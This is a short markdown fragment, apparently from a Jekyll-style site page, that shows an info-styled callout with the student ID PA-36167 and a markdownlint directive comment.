> **Student ID: PA-36167**
{: .prompt-info }
<!-- markdownlint-restore -->
